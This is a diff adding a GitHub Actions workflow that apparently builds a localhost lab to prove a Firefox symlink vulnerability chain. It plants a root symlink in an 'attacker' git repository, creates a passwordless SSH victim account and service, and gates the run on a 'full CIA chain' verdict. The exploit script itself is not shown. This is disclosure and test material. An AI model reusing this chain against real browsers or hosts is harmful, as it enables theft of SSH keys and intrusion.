@@ -1,0 +1,172 @@
+name: Firefox POSIX symlink to authenticated execution proof
+
+on:
+  push:
+    branches: [runner-probe-20260910]
+    paths:
+      - .github/workflows/firefox-posix-symlink-ssh-e2e.yml
+      - proof-lab-posix-ssh-20260910/**
+
+permissions:
+  contents: write
+
+env:
+  LAB_DIR: proof-lab-posix-ssh-20260910
+
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: runner-probe-20260910
+
+      - name: Install Firefox
+        id: firefox
+        uses: browser-actions/setup-firefox@v1
+        with:
+          firefox-version: latest
+
+      - name: Install GeckoDriver
+        id: geckodriver
+        uses: browser-actions/setup-geckodriver@latest
+
+      - name: Install lab dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openssh-server curl
+          python -m pip install --disable-pip-version-check selenium
+
+      - name: Build isolated victim and subsequent-system lab
+        shell: bash
+        run: |
+          set -euxo pipefail
+          sudo userdel -r labsvc 2>/dev/null || true
+          sudo useradd -m -s /bin/bash labsvc
+          sudo passwd -d labsvc
+
+          VICTIM_SECRETS=/tmp/firefox-victim-secrets
+          SELECTED="$RUNNER_TEMP/attacker-repository"
+          rm -rf "$VICTIM_SECRETS" "$SELECTED"
+          mkdir -p "$VICTIM_SECRETS" "$SELECTED"
+          ssh-keygen -q -t ed25519 -N '' -f "$VICTIM_SECRETS/id_ed25519"
+
+          sudo install -d -m 700 -o labsvc -g labsvc /home/labsvc/.ssh
+          sudo install -m 600 -o labsvc -g labsvc "$VICTIM_SECRETS/id_ed25519.pub" /home/labsvc/.ssh/authorized_keys
+          printf %s REMOTE_CONFIDENTIALITY_MARKER_87cd22 | sudo tee /home/labsvc/server-secret.txt >/dev/null
+          printf %s REQUIRED_FOR_SERVICE | sudo tee /home/labsvc/availability-required.flag >/dev/null
+          sudo mkdir -p /home/labsvc/service
+          printf %s SERVICE_HEALTHY | sudo tee /home/labsvc/service/health.txt >/dev/null
+          sudo chown -R labsvc:labsvc /home/labsvc
+
+          sudo -u labsvc bash -c 'nohup python3 -m http.server 9123 --bind 127.0.0.1 --directory /home/labsvc/service >/home/labsvc/service.log 2>&1 & echo $! >/home/labsvc/service.pid'
+          for i in $(seq 1 30); do curl -fsS http://127.0.0.1:9123/health.txt && break; sleep 0.2; done
+          curl -fsS http://127.0.0.1:9123/health.txt
+
+          sudo mkdir -p /run/sshd
+          sudo ssh-keygen -A
+          cat > "$RUNNER_TEMP/sshd_config" <<EOF
+          Port 2222
+          ListenAddress 127.0.0.1
+          HostKey /etc/ssh/ssh_host_ed25519_key
+          PidFile $RUNNER_TEMP/sshd.pid
+          AuthorizedKeysFile .ssh/authorized_keys
+          PubkeyAuthentication yes
+          PasswordAuthentication no
+          KbdInteractiveAuthentication no
+          ChallengeResponseAuthentication no
+          UsePAM no
+          PermitRootLogin no
+          AllowUsers labsvc
+          LogLevel VERBOSE
+          Subsystem sftp internal-sftp
+          EOF
+          sed -i 's/^          //' "$RUNNER_TEMP/sshd_config"
+          sudo /usr/sbin/sshd -f "$RUNNER_TEMP/sshd_config" -E "$RUNNER_TEMP/sshd.log"
+
+          git -C "$SELECTED" init
+          printf %s ATTACKER_REPOSITORY_MARKER > "$SELECTED/README.txt"
+          ln -s / "$SELECTED/root-link"
+          git -C "$SELECTED" add README.txt root-link
+          git -C "$SELECTED" -c user.name=lab -c user.email=lab@example.invalid commit -m 'Attacker-supplied repository containing root symlink'
+          git -C "$SELECTED" ls-files -s root-link | grep '^120000 '
+
+          echo "LAB_SELECTED=$SELECTED" >> "$GITHUB_ENV"
+          echo "LAB_PRIVATE_KEY=$VICTIM_SECRETS/id_ed25519" >> "$GITHUB_ENV"
+          echo "LAB_REMOTE_HOME=/home/labsvc" >> "$GITHUB_ENV"
+          echo "LAB_SERVICE_URL=http://127.0.0.1:9123/health.txt" >> "$GITHUB_ENV"
+
+      - name: Run real-Firefox end-to-end chain
+        env:
+          FIREFOX_BINARY: ${{ steps.firefox.outputs.firefox-path }}
+          GECKODRIVER: ${{ steps.geckodriver.outputs.geckodriver-path }}
+        run: |
+          python "$LAB_DIR/run_e2e.py"
+
+      - name: Produce sanitized proof summary
+        if: always()
+        run: |
+          mkdir -p .proof-results
+          python - <<'PY'
+          import json
+          from pathlib import Path
+          src = Path('proof-lab-posix-ssh-20260910/result.json')
+          if src.exists():
+              full = json.loads(src.read_text())
+              summary = {
+                  'workflow_run_id': '${{ github.run_id }}',
+                  'verdict': full.get('verdict'),
+                  'cvss_candidate': full.get('cvss_candidate'),
+                  'conditions': full.get('conditions'),
+                  'browser': full.get('browser_capabilities'),
+                  'git_symlink_index': full.get('git_symlink_index'),
+                  'root_link_target': full.get('root_link_target'),
+                  'private_key_outside_selected': full.get('private_key_outside_selected'),
+                  'browser_exfil_sha256': full.get('browser_exfil_sha256'),
+                  'expected_key_sha256': full.get('expected_key_sha256'),
+                  'ssh_returncode': full.get('ssh_returncode'),
+                  'service_pre_attack_status': full.get('service_pre_attack_status'),
+                  'remote_service_post_attack_unavailable': full.get('remote_service_post_attack_unavailable'),
+                  'browser_error': full.get('browser_error'),
+                  'page_state': full.get('page_state'),
+              }
+          else:
+              summary = {'workflow_run_id': '${{ github.run_id }}', 'verdict': 'RUNNER_RESULT_MISSING'}
+          Path('.proof-results/posix-symlink-ssh-summary.json').write_text(json.dumps(summary, indent=2))
+          PY
+
+      - name: Upload complete controlled evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: firefox-posix-symlink-ssh-proof
+          path: |
+            proof-lab-posix-ssh-20260910/result.json
+            proof-lab-posix-ssh-20260910/firefox-proof.png
+            ${{ runner.temp }}/sshd.log
+            .proof-results/posix-symlink-ssh-summary.json
+          if-no-files-found: warn
+          retention-days: 1
+
+      - name: Publish sanitized result
+        if: always()
+        run: |
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add .proof-results/posix-symlink-ssh-summary.json
+          git commit -m 'Publish sanitized Firefox symlink SSH proof result' || exit 0
+          git push origin HEAD:runner-probe-20260910
+
+      - name: Strict proof gate
+        if: always()
+        run: |
+          python - <<'PY'
+          import json
+          from pathlib import Path
+          p = Path('.proof-results/posix-symlink-ssh-summary.json')
+          d = json.loads(p.read_text())
+          assert d.get('verdict') == 'CONFIRMED_FULL_CIA_CHAIN', json.dumps(d, indent=2)
+          assert d.get('cvss_candidate') == 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H'
+          print('STRICT_9_6_CHAIN_CONFIRMED')
+          PY
